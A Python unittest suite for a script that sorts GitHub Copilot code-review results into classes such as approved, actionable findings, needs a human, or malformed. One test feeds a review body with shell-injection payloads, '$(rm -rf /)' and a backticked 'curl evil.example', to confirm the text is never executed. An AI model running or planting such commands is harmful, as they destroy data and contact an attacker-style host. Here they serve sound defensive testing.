#!/usr/bin/env python3
"""Regression tests for classify-copilot-review.py (no network)."""

import importlib.util
import json
import subprocess
import sys
import unittest
from pathlib import Path


SCRIPTS = Path(__file__).resolve().parent
FIXTURES = SCRIPTS / "fixtures" / "copilot-reviews"
_SPEC = importlib.util.spec_from_file_location(
    "classify_copilot_review_mod", SCRIPTS / "classify-copilot-review.py"
)
MOD = importlib.util.module_from_spec(_SPEC)
sys.modules[_SPEC.name] = MOD
_SPEC.loader.exec_module(MOD)


def load_fixture(name: str) -> dict:
    return json.loads((FIXTURES / name).read_text(encoding="utf-8"))


def classify_fixture(name: str, **kwargs):
    review = load_fixture(name)
    inp = MOD.review_input_from_github(review, **kwargs)
    return MOD.classify_review(inp)


class ClassifyCopilotReviewTests(unittest.TestCase):
    def test_approved_github_state(self):
        out = classify_fixture("approved-none.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_APPROVED)
        self.assertFalse(out["requires_fixer"])
        self.assertEqual(out["finding_count"], 0)

    def test_changes_recommended_with_finding(self):
        out = classify_fixture("changes-one-finding.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_ACTIONABLE_FINDINGS)
        self.assertTrue(out["requires_fixer"])

    def test_closer_look_with_inline_findings(self):
        out = classify_fixture(
            "closer-look-with-finding.json",
            open_finding_titles=("Parser mishandles rank edge case",),
        )
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_ACTIONABLE_FINDINGS)
        self.assertEqual(out["finding_count"], 1)

    def test_closer_look_none_is_diagnostic_not_clean(self):
        out = classify_fixture("closer-look-none-en-pot.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_CLOSER_LOOK_DIAGNOSTIC)
        self.assertTrue(out["requires_fixer"])
        self.assertIn("en.pot", out["rationale"])

    def test_closer_look_none_with_resolved_section(self):
        out = classify_fixture("closer-look-none-resolved.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_CLOSER_LOOK_DIAGNOSTIC)
        self.assertGreaterEqual(len(out["resolved_since_last_titles"]), 1)

    def test_human_validation_rationale(self):
        out = classify_fixture("closer-look-human-validation.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_HUMAN_REQUIRED)
        self.assertTrue(out["requires_human"])

    def test_validation_missing_rationale(self):
        out = classify_fixture("closer-look-validation-missing.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_VALIDATION_MISSING)

    def test_copilot_error(self):
        out = classify_fixture("copilot-error.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_REVIEW_ERROR)
        self.assertTrue(out["requires_human"])

    def test_non_copilot_reviewer(self):
        out = classify_fixture("non-copilot.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_NON_COPILOT)

    def test_malformed_empty_body(self):
        out = classify_fixture("malformed-empty.json")
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_MALFORMED)

    def test_unicode_heading_still_parses(self):
        out = classify_fixture("unicode-mojibake-heading.json")
        self.assertEqual(out["assessment"], MOD.ASSESSMENT_NEEDS_CLOSER_LOOK)
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_CLOSER_LOOK_DIAGNOSTIC)

    def test_open_titles_override_findings_none(self):
        out = classify_fixture(
            "closer-look-none-en-pot.json",
            open_finding_titles=("Missing catalog entry",),
        )
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_ACTIONABLE_FINDINGS)

    def test_rationale_fingerprint_stable(self):
        a = MOD.rationale_fingerprint("  Hello   world ")
        b = MOD.rationale_fingerprint("hello world")
        self.assertEqual(a, b)

    def test_repeat_closer_look_loop_guard(self):
        current = classify_fixture("closer-look-none-en-pot.json")
        prior = [
            {
                "review_id": "9000000000",
                "head_sha": current["head_sha"],
                "rationale_fingerprint": current["rationale_fingerprint"],
                "classification": MOD.CLASSIFICATION_CLOSER_LOOK_DIAGNOSTIC,
                "finding_count": 0,
            }
        ]
        guarded = MOD.apply_loop_guards(current, prior)
        self.assertEqual(guarded["classification"], MOD.CLASSIFICATION_HUMAN_REQUIRED)
        self.assertEqual(guarded.get("loop_guard"), "repeat_closer_look_same_head")

    def test_new_review_same_head_not_deduped_by_sha(self):
        shared_head = "abababababababababababababababababababab"
        first_review = load_fixture("closer-look-none-en-pot.json")
        second_review = load_fixture("closer-look-none-resolved.json")
        first_review["commit_id"] = shared_head
        second_review["commit_id"] = shared_head
        first = MOD.classify_review(MOD.review_input_from_github(first_review))
        second = MOD.classify_review(MOD.review_input_from_github(second_review))
        self.assertEqual(first["head_sha"], second["head_sha"])
        self.assertNotEqual(first["review_id"], second["review_id"])
        self.assertNotEqual(first["rationale_fingerprint"], second["rationale_fingerprint"])

    def test_duplicate_review_id_is_distinct_event(self):
        first = classify_fixture("closer-look-none-en-pot.json")
        second = classify_fixture("closer-look-none-en-pot.json")
        self.assertEqual(first["review_id"], second["review_id"])
        self.assertEqual(first["classification"], second["classification"])

    def test_review_text_never_executed_as_shell(self):
        malicious = {
            "id": 1,
            "user": {"login": MOD.COPILOT_REVIEWER_LOGIN},
            "state": "COMMENTED",
            "commit_id": "a" * 40,
            "body": "$(rm -rf /)\n`curl evil.example`",
        }
        inp = MOD.review_input_from_github(malicious)
        out = MOD.classify_review(inp)
        self.assertEqual(out["classification"], MOD.CLASSIFICATION_MALFORMED)
        proc = subprocess.run(
            [
                sys.executable,
                str(SCRIPTS / "classify-copilot-review.py"),
                "--review-json",
                "-",
            ],
            input=json.dumps(malicious),
            capture_output=True,
            text=True,
            check=True,
        )
        self.assertIn("MALFORMED", proc.stdout)
        self.assertNotIn("rm -rf", proc.stderr)

    def test_cli_round_trip_fixture(self):
        fixture = FIXTURES / "approved-none.json"
        proc = subprocess.run(
            [
                sys.executable,
                str(SCRIPTS / "classify-copilot-review.py"),
                "--review-json",
                str(fixture),
            ],
            capture_output=True,
            text=True,
            check=True,
        )
        data = json.loads(proc.stdout)
        self.assertEqual(data["classification"], MOD.CLASSIFICATION_APPROVED)


if __name__ == "__main__":
    unittest.main()
